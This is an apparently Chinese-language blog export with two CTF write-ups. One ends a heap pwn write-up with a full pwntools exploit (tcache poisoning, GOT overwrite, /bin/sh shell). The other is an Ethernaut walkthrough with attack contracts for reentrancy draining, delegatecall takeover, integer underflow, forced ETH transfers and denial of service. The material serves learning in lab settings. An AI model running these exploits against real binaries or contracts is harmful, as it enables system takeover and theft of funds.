<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts<br />
</li>
<li>修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr  = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br></pre></td></tr></table></figure></li>
<li>找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh然后free掉他，getshell！
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;101.200.234.115&#x27;</span></span><br><span class="line">port = <span class="number">42490</span></span><br><span class="line">file = <span class="string">&#x27;./takeway&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./takeway&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">  io.sendafter(<span class="string">&#x27;remark: &#x27;</span>, remark)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,name</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, name)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr  = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x05-总结">0x05 总结</h1>
<p>这题太遗憾了...最后也没做出来。不过做一窍不通的题收获才最大。<br />
做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br />
对tcachebin的第一印象如下:<br />
1. 概述<br />
1. 0x10~0x410（貌似是）的chunk 2. LIFO 3.
大小只有7，free满以后再free就会放到对应的其他bin中 4.
2.28及以下的libc不检测double free 2. 伪造chunk 1.
安全性比fastbin还差，不检验fd指向chunk的size直接申请 3. leak堆地址 1.
2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry
目前就想到这些，这次多亏队友带飞，进半决赛了XD</p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>WriteUp - Reverse - Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - Ethernaut智能合约漏洞靶场复现</title>
    <url>/posts/36493.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
接到了链上的项目，正好学习一下
</blockquote>
<span id="more"></span>
<h1 id="x00-环境搭建">0x00 环境搭建</h1>
<p>我用的是<a
href="https://ethernaut.openzeppelin.com/">这个靶场</a>，需要下载MetaMask，下载完毕之后可以切换到Sepolia测试币，去<a
href="https://sepolia-faucet.pk910.de/">这里</a>开源挖币，就有测试币可以搭建Instance了(不过需要认证score，也很简单，只需要认证好github就能过)</p>
<h1 id="x01-题目">0x01 题目</h1>
<h2 id="hello-ethernaut">00 Hello Ethernaut</h2>
<p>这个题目完全是新手教程，让我们与contract的info这个method进行交互，我们打开控制台按照他的意思一直contract.xxx("xxx")就行了</p>
<h2 id="fallback">01 Fallback</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:fallback/receive 函数触发时机</p>
</blockquote>
<h3 id="basic">Basic</h3>
<p>这一关的名字是Fallback，fallback是一类函数，这类函数可以在合约接收到以太币时执行一些操作（Exploration里有更精确的定义）。本题中，当接收的币大于0并且币的发送方在发送这条消息之前已经对该合约有了贡献（发送过币），那就把这个合约的所有权移交给币的发送方。</p>
<p>也就是说，我们只需要 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>
就已经将控制权掌握在我们手中了，此时就可以使用被onlyOwner这个modifier修饰的withdraw函数了
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()              <span class="comment">// 查看合约所有权</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)  <span class="comment">// 查看合约剩余余额</span></span><br></pre></td></tr></table></figure></p>
<h3 id="exploration">Exploration</h3>
<p>我很好奇按照上面的说法，contribute两次应该也可以吧，不用非得contribute一次再sendtransaction一次才能提权。后来我尝试了一下果然不行，因为contribute在合约里有明确定义，合约收到Ether之后会调用contribute里的逻辑去处理这个Ether。但sendTransaction属于向合约发起交易，并且没有附加数据(msg.data)，因此会隐式调用receive函数（也就是Fallback函数）进行逻辑处理。</p>
<p>因此本题fallback函数的调用条件是：当合约接收到代币但没有处理代币的函数，并且没有附加数据时，会调用fallback函数来处理。但我问了GPT老师，他的回答是这样的：</p>
<p>触发 fallback 函数的情况：</p>
<p>①调用不存在的函数：如果调用的函数在合约中不存在，且合约定义了
fallback 函数，则会触发 fallback 函数。</p>
<p>②发送以太币但没有数据，且没有定义 receive 函数：如果合约中没有定义
receive 函数，发送纯以太币且没有附加数据时，会触发 fallback 函数。</p>
<p>③发送以太币且有附加数据：如果发送以太币且附加了数据（即 msg.data
不为空），即使合约定义了 receive 函数，也会触发 fallback 函数。</p>
<p>exp如下 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0.000000000000000001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0.000000000000000002&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x9a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x9a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>ps: 打这关的时候提交有的时候会显示不通过，但多submit几次就好了</p>
<h2 id="fallout">02 Fallout</h2>
<blockquote>
<p>漏洞类型：权限设置错误/关键函数拼写错误</p>
</blockquote>
<p>这题貌似是想告诉我们不要把构造函数公有化？因为只要调用这个Fal1out函数就能掌握所有权了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out()</span><br></pre></td></tr></table></figure>
<h2 id="coin-flip">03 Coin Flip</h2>
<blockquote>
<p>漏洞类型：预测伪随机数</p>
</blockquote>
<blockquote>
<p>take-away msg:部分全局变量；伪随机数预测</p>
</blockquote>
<p>猜硬币，这种随机数肯定是伪随机数，可以预测的。</p>
<p>看合约源码得知blockValue是前一个区块的hash值，并将其转换为无符号整数。</p>
<p>如果lasthash值（上个区块的hash值）等于blockValue，就说明这个blockValue被用过了，调用revert函数返回gas。我们只能等新区块生成之后再预测（比特币10min生成一个区块，以太坊只需要15s）</p>
<p>如果lasthash等于blockValue，就用blockValue除以FACTOR得到一个结果coinFlip，我们要猜这个数字是1还是0。</p>
<p>源码分析完了，伪随机数是blockValue，由于我们已经知道了FACTOR，所以只要知道了blockValue就可以直到后面的全部内容，我们来分析一下为什么可以预测blockValue</p>
<p>当交易在链上被发送时，这些交易会被矿工打包到即将挖出的下一个区块中，区块包含多个交易，这些交易会顺序执行。在同一笔交易中，如果一个合约调用另一个合约，这些调用会在同一个区块中顺序执行。区块链的每个区块都有一个固定的时间窗（例如，比特币的每个区块时间为10分钟，以太坊的每个区块时间为15秒）。在这个时间窗内，所有被打包到这个区块中的交易会共享相同的区块哈希和区块编号。</p>
<p>因此，只要我们写一个攻击合约，在攻击合约中获取block.number，再调用被攻击合约的flip函数，那么flip中的block.number就跟攻击合约中的number是相同的了。因此也就达成了攻击的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address addr;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    event Result(bool, bool);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        addr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip() external &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory data) = addr.call(abi.encodeWithSignature(&quot;flip(bool)&quot;, side));</span><br><span class="line">        emit Result(success, abi.decode(data, (bool)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="telephone">04 Telephone</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:直接调用者 &amp; 间接调用者</p>
</blockquote>
<p>本题主要考察 tx.origin 与 msg.sender 的区别，tx.orgin
指的是交易的发起方，msg.sender
指的是合约的直接调用者。比如，当用户X通过合约A调用合约B时：对于合约A，tx.origin
与 msg.sender 都是用户X；对于合约B，tx.origin 是用户X，msg.sender
是合约A</p>
<p>因此我们只需要部署一个合约A，通过该合约调用题目函数即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone constant private target = Telephone(0xdeE55F3707b4462D224A931cB6B2e2c619C9EFFB);</span><br><span class="line">    function call() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="token">05 Token</h2>
<blockquote>
<p>漏洞类型：整数溢出</p>
</blockquote>
<blockquote>
<p>take-away msg:整数溢出</p>
</blockquote>
<p>整数溢出。balances 和 value 都是 uint256
型的，所以减完了还是正数，由于初始余额有20，我们直接减21即可
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.<span class="property">address</span></span><br><span class="line"><span class="string">&#x27;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(<span class="string">&quot;0x440f5dD58996e284Bf339399cE48580cf2ADC84b&quot;</span>,<span class="number">21</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="delegation">06 Delegation</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:代理合约；delegatecall</p>
</blockquote>
<p>本题考察对合约调用方式的理解。合约调用共有三种方式</p>
<ul>
<li>call: 调用后内置变量 msg
的值会修改为调用者，执行环境为被调用者的运行环境</li>
<li>delegatecall: 调用后内置变量 msg
的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</li>
<li>callcode: 调用后内置变量 msg
的值会修改为调用者，但执行环境为调用者的运行环境 &gt; 貌似 "callcode"
已被弃用，取而代之的是 "delegatecall"</li>
</ul>
<p>也就是说，当我们以 call 的形式通过合约 Delegation 调用合约 Delegate
的 pwn 函数时，Delegate 中记录的 msg.sender 是 Delegation
的地址；而当我们以 Delegate call 的形式通过合约 Delegation 调用合约
Delegate 的 pwn 函数时，Delegate 中记录的 msg.sender
是我们自己的地址。</p>
<p>类比 Telephone 那道题，普通 call 的 msg.sender 就是 msg.sender，而
DelegateCall 的 msg.sender 是 tx.origin。</p>
<p>在本题中，合约 Deletation 部署了合约 Delegate，并且有 pwn
函数可以让我们提权，我们需要通过触发 fallback，通过传入的 data 调用
pwn()，即<code>await contract.sendTransaction(&#123;data:"0xdd365b8b"&#125;);</code>，至于为什么是
0xdd365b8b，这好像是 pwn()
函数的签名再哈希以后的前四字节，可以通过下面的 solidity 代码生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    bytes4 public result;</span><br><span class="line">    function test() public  &#123;</span><br><span class="line">        result = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以通过<code>await web3.utils.keccak256("pwn()")</code>生成</p>
<h2 id="force">07 Force</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:通过自毁函数强制转入eth</p>
</blockquote>
<p>本题给了空合约，旨在让我们学会如何在合约拒绝转入时强制给它转入
ETH</p>
<p>可以通过 selfdestruct() 函数来完成目标，这个合约析构函数有以下性质：
1. 指令执行后，合约将拒绝服务，地址对应的字节码将被标注为删除</p>
<ol start="2" type="1">
<li><p><strong>合约地址中所有的 ETH
将被发送到指定的新地址</strong></p></li>
<li><p>进行 ETH 转移时，即使目标地址为一个合约地址，也不会触发该地址的
fallback 函数，因此不需要该合约有任何的 payable 函数</p></li>
<li><p>如果 selfdestruct 函数被非预期执行，整个合约会拒绝服务</p></li>
</ol>
<p>也就是说我们可以写一个合约，让它析构的时候给要攻击的合约转入 1wei,在
remix 上部署以下合约即可，记得 value 设置成 1wei</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function forceAttack(address payable _addr) payable external &#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="vault">08 Vault</h2>
<blockquote>
<p>漏洞类型：隐私信息上链</p>
</blockquote>
<blockquote>
<p>take-away msg:不要把隐私信息上链，因为全公开</p>
</blockquote>
<p>vault 是金库的意思，合约源码把密码设置成 private 了，但这个 private
是幽默 private，因为区块链中所有存储在 storage
里的东西都是公开的，也就是说我们可以通过 <a
href="https://ethereum.stackexchange.com/questions/13910/how-to-read-a-private-variable-from-a-contract">getStorageAt</a>
来查看合约的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await web3.eth.getStorageAt(instance);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,1);</span><br><span class="line">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,0);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,2);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,3);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span><br><span class="line"></span><br><span class="line">await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;);</span><br><span class="line"></span><br><span class="line">await contract.locked();</span><br></pre></td></tr></table></figure>
<h2 id="king">09 King</h2>
<blockquote>
<p>漏洞类型：未检查返回值</p>
</blockquote>
<p><code>((await contract.prize()).toString());</code>
可以查看这个合约的余额。</p>
<p>transfer 转账时如果遇到错误会 revert,
根据这个特性可以使得某个恶意合约成为 king, 该合约的 receive 方法始终
revert，而call和send函数则不是，而是返回一个false，因此这就是为什么需要检查call和send的返回值的原因。</p>
<p>直接写个合约，在里面fallback抛出异常即可。不过设置 revert
有个比较麻烦的点是不能给这个合约转钱了，所以只能把我的钱包地址设置白名单了。不过或许可以用之前那个
Force 的方式试试🤔之后再说吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    event Received(address sender);</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if(msg.sender != Your Wallet Address here)&#123;</span><br><span class="line">            emit Received(msg.sender); // 记录 msg.sender</span><br><span class="line">            revert(&quot;Error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimKing(address payable addr) public payable &#123;</span><br><span class="line">        (bool success, ) = addr.call&#123;value: 0.01 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="re-entrancy">10 Re-entrancy</h2>
<blockquote>
<p>漏洞类型：重入攻击</p>
</blockquote>
<blockquote>
<p>take-away msg:重入的举例与防护</p>
</blockquote>
<p>重入攻击久仰大名，重入指的是攻击者在被攻击合约更新余额前重复提款的行为，我们可以在
fallback 或者 receive 函数里再次调用
withdraw，这样他就会再次向被攻击合约提出提款请求。</p>
<p>我们可以用<code>await getBalance(contract.address)</code>来查看合约的余额，这里“合约余额”与“合约定义的用户余额”不太一样，要注意一下。</p>
<p>还有就是，我最后攻击的时候用户余额已经溢出了，仍然不能提款，应该是每次提款的数目已经大于“合约余额”了，比如合约余额只剩0.004的时候我要提0.01，那就是不行的，只能以0.001为单位去提取。</p>
<p>exp 如下，不过要在前面加上 <a
href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8e0296096449d9b1cd7c5631e917330635244c37/contracts/math/SafeMath.sol">SafeMath库</a>，然后把题目源码也粘在前面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">// 粘贴 SafeMath 库</span><br><span class="line"></span><br><span class="line">// 粘贴题目源码</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Reentrance r;</span><br><span class="line">    uint256 amount = 0.001 ether;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address payable addr) public &#123;</span><br><span class="line">        r = Reentrance(addr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(r).balance &gt;= amount) &#123;</span><br><span class="line">            r.withdraw(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        r.donate&#123;value: amount&#125;(address(this));</span><br><span class="line">        r.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toMe() external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</span><br><span class="line">        (bool success, ) = owner.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="elevator">11 Elevator</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:view/pure？但我没用到这两个修饰符</p>
</blockquote>
<p>这道题在本地实现好
isLastFloor，让其根据调用次数的不同返回不同值就行，第一次返回
false，第二次返回 true.</p>
<p>题目提示合约不适合保存 promises，我有点没太理解 promises
的意思...或许之后可以看看 view 和 pure 来帮助理解这一点吧。今天刷了 8
道题，得休息一下..</p>
<p>题目说：</p>
<blockquote>
<p>你可以在接口使用 view 函数修改器来防止状态被篡改. pure
修改器也可以防止状态被篡改. 认真阅读 Solidity's documentation
并学习注意事项. 完成这一关的另一个方法是构建一个 view 函数,
这个函数根据不同的输入数据返回不同的结果, 但是不更改状态, 比如
gasleft().</p>
</blockquote>
<p>抽时间可以看看</p>
